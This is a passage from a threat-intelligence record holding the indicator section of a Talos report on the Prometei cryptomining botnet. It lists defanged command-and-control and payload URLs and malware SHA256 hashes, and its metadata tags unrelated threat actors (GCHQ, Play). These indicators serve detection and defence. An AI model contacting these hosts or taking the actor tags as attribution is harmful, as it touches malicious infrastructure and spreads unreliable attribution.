(NGFW), Next-Generation Intrusion](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\n[Prevention System (NGIPS),Cisco ISR, andMeraki MX can detect malicious activity associated with this](https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html)\nthreat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and](https://umbrella.cisco.com/)\nURLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack\n[available for purchase onSnort.org.](https://www.snort.org/products)\n\n## IOCs\n\n**OSQuery**\n\nCisco AMP users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are\ninfected with this specific threat. For specific OSqueries on this threat, click below:\n\n[Prometei botnet registry entry](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/malware_prometei_registry.yaml)\n\n**URLs**\n\nhxxp://103[.]11[.]244[.]221/crawler[.]php\n\nhxxp://103[.]11[.]244[.]221/lR[.]php\n\nhxxp://208[.]66[.]132[.]3:8080/7z[.]dll\n\nhxxp://208[.]66[.]132[.]3:8080/7z[.]exe\n\nhxxp://208[.]66[.]132[.]3:8080/_agent[.]7z\n\n\n-----\n\nhxxp://208[.]66[.]132[.]3:8080/chk445[.]php\nhxxp://208[.]66[.]132[.]3:8080/Desktop[.]txt\nhxxp://208[.]66[.]132[.]3:8080/dllr0[.]php\nhxxp://208[.]66[.]132[.]3:8080/srchindx2[.]php\nhxxp://208[.]66[.]132[.]3:8080/zlib[.]php\nhxxp://208[.]66[.]132[.]3:8080/ztasklist[.]php\nhxxp://69[.]28[.]95[.]50:180/miwalk[.]txt\nhxxp://69[.]28[.]95[.]50:180/walker14364[.]php\nhxxp://69[.]84[.]240[.]57:180/lR[.]php\nhxxp://69[.]84[.]240[.]57:180/miwalk[.]txt\nhxxp://69[.]84[.]240[.]57:180/walker14364[.]php\nhxxp://bk1[.]bitspiritfun2[.]net/cgi-bin/prometei[.]cgi\nhxxp://p1[.]feefreepool[.]net/cgi-bin/prometei[.]cgi\nhxxps://gb7ni5rgeexdcncj[.]onion/cgi-bin/prometei[.]cgi\nhxxps://211[.]23[.]16[.]239/prometheus[.]php\n\n**SHA256s**\n\nSvchost.exe sha256s\n\n601a1269ca0d274e518848c35a2399115000f099df149673b9dbc3cd77928d40\n\n58d210b47abba83c54951f3c08a91d8091beae300c412316089b5506bd330adc\n\nae078c49adba413a10a38a7dcfc20359808bc2724453f6df03a517b622cbca0e\n\n9a5c109426480c7283f6f659cb863be81bd46301548d2754baf8b38e9e88828d\n\nd363dc2aafdf0d9366b5848fc780edfa6888418750e2a61148436908ea3f5433\n\n8ca679d542904a89d677cb3fd7db309364f2214f6dc5e89099081835bec4e440\n\nfe0a5d851a9dd2ba7d1b0818f59363f752fc7343bdfc306969280ade54b2f017\n\n7f78ddc27b22559df5c50fd1e5d0957369aadd1557a239aaf4643d51d54c4f94\n\n0d6ca238faf7911912b84086f7bdad3cd6a54db53677a69722de65982a43ee09\n\nc08f291510cd4eccaacff5e04f0eca55b97d15c60b72b204eae1fc0c8d652f48\n\nf6eddbabc1d6b05d2bc27077bcb55ff640c5cf8b09a18fc51ed160a851f8be58\n\n8b7b40c0f59bbe4c76521b32cc4e344033c5730ccb9de28cfba966d8c26ca3ef\n\na7ad84e8f5deb1d2e32dd84f3294404a5f7f739215bdd90d7d37d74ee8a05409\n\n76110b87e46eb61f492d680a2b34662040bb9c25c947a599536cdaf5170fe581\n\necd4c12ef01028c3f544c0f7c871c6d6f256997f1b7be4c8fdbb0f8572012444\n\nb0500636927b2ddb1e26a21fbf19a8c1fc47a260062976ddbef60fd47c21dc6e\n\nea2174993892789f0c1081152c31b3b3fef79c6a5016840ea72321229c7fe128\n\n9e86d18d5761493e11fe95d166c433331d00e4f1bf3f3b23a07b95d449987b78\n\n923201672a41f93fb43dae22f30f7d2d170c0b80e534c592e796bd8ad95654ea\n\n1df6e9705e9ffb3d2c4f1d9ca49f1e27c4bcac13dba75eac9c41c3785a8ca4b1\n\nMsdtc sha256s\n\n7c71fb85b94fb4ff06bbaf81d388d97f6e828428ee9f638525d4f6e488e71190\n\n994d20fee2bd05e67c688e101f747a5d17b0352a838af818ad357c8c7a34a766\n\nd3dc9cdb106902471ee95016440b855806e8e5dd0f313864e46126fd3ecfe4fe\n\nSorted\n\n\n-----\n\n4ec815b28fe30f61a282c1943885fa81c6e0e98413f5e7f3f89ec6810f3b62a3 - SearchIndexer.exe\ne0a181318eb881d481d2e4830289ed128006269ace890139f054cf050351500a - chk445.exe\n6935e6a303d3dff35079ae3ec78fd85b7bd4ff3ee2458b82cbfa548d7972c6d7 - crawler.exe\n7c71fb85b94fb4ff06bbaf81d388d97f6e828428ee9f638525d4f6e488e71190 - SearchIndexer.exe\na02b532cc9dc257009d7f49382746d9d0bce331a665f4a4c12ae6fc2917df745 - miwalk.exe\n7c71fb85b94fb4ff06bbaf81d388d97f6e828428ee9f638525d4f6e488e71190 - msdtc.exe\na303bc8d4011183780344329445bc6dfbb8417f534f304c956e4f86468d620d5 - nvstub.exe\n0970037be8f90c3b2b718858a032e77916969113823895e268c7693dddba1181 - nvsync2.exe\ndc2fee73b41d488a1cccd905ecc9030e66ff7c7e5dcf60fc580406c6f8090854 - nvsync4.exe\n382c3e80eadd7ca7b224ebe1fe656555fb15227face38fbea40ae4a9515ecb80 - ps.exe\n54967e106bb2acfd5b4e69fc385c1c20d5af3bdc79b629a9e3ddb3a2375f0bc1 - rdpcIip.exe\nb65aef379e3173ca32b83fd0c54483c2090966910fdda3145af97b5dbff85427- smcard.exe\n0dd1d869b3c7ce4af03ce4db6172b84d66c3779b48493d7e504de9d350195c5b - socks.exe\n559d65f11e9143dfb093cabc6a1430438643922035765a445276abd80c15ce4b - svchost1.exe\nc08f291510cd4eccaacff5e04f0eca55b97d15c60b72b204eae1fc0c8d652f48 - svchost2.exe\n94d066b7d2d8b95d6da525f61c19a7bbdec5afdb033dfe2712dd51d5073b1db2 - svchost64bitearlier.exe\nf09679bae1388033b17196f92430678e7b15816648f380bb4de3dd25009011b7 - ztasklist.exe\n0ed9ac4238a4b5aadcd845e4dcd786ce2ee265a6b1a50e8b9019cceb6c013de5 - tor-gencert.exe\nf6eddbabc1d6b05d2bc27077bcb55ff640c5cf8b09a18fc51ed160a851f8be58 - zsvc.exe\n\nOther\n\na02b532cc9dc257009d7f49382746d9d0bce331a665f4a4c12ae6fc2917df745\nf555431a09ae975ac0e8f138ce4eaf44cd8a3460e3bb7ba44b0101cd3a5b1157\n61428b3d336636bfef0e7fe1783f9b2d62182c06d3928ec4b9b7201170e24fb6\n89d5e5d51e9bb0cee8708adc5dd3e961410b6a55963f020a5930ed93aa68c0eb\n24554a4eed764023d6e5e4990729308ee80ce0f3437ab4af6ad0ebff64512516\n3574734ad6416ca584c4c0211156fb24107e9b983e6542199736530e4a4effcd\n7f7f474d054ffc638b72f8bdd34e31315a8c72846d15479f86919569fea5b5fc\n0c821863e8fd8e493d90004f734055f91b8f43d3b905a38dc983443146f48602\n236120868431f1fe3637623a8a4cbda6bbfdd71c4e55a1dff76efa0381274623\n02e1852066ad61bddf98943cb8e3091d6e23d75bf24340809e8212aedfd6e450\n50c5a74fd34ae16557e077e4116b823d049ac735e0ec31328851b385b4891523\n1946c56c261d86dd78f087cb6452a0cc58895c7bcb7c73a8023ee6c9d5a5c2eb\n57cb49a5406b0ed9c81907940fda8cd534116e19a7821ad3061b209f46675f2d\na1c05973ac397fe81b2e553aecc322c794dc5977928e7b56cf1c8a62f68afdf0\nefaa199e64bd4132a4bf783c37bbc20fefb6ea45ff60ea68f4a4214bf8ab1268\n54967e106bb2acfd5b4e69fc385c1c20d5af3bdc79b629a9e3ddb3a2375f0bc1\na122eeeac51784d54ddf159749b4e657ad821037237c07540fb2ff25a67b1210\neeb1a574da0836a4ac34132d96fd442d7c5827e607389ef1dfebeb419a09dae7\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-22 - Prometei botnet and its quest for Monero.pdf"
    ],
    "report_names": [
        "2020-07-22 - Prometei botnet and its quest for Monero.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536185,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653773983,
    "ts_modification_date": 1653773983,
    "files": {
        "pdf": "https://archive.orkl.eu/f8575e31cb18fd99e921cb2cd96b9aa9fae5b05b.pdf",
        "text": "https://archive.orkl.eu/f8575e31cb18fd99e921cb2cd96b9aa9fae5b05b.txt",
        "img": "https://archive.orkl.eu/f8575e31cb18fd99e921cb2cd96b9aa9fae5b05b.jpg"
    }
}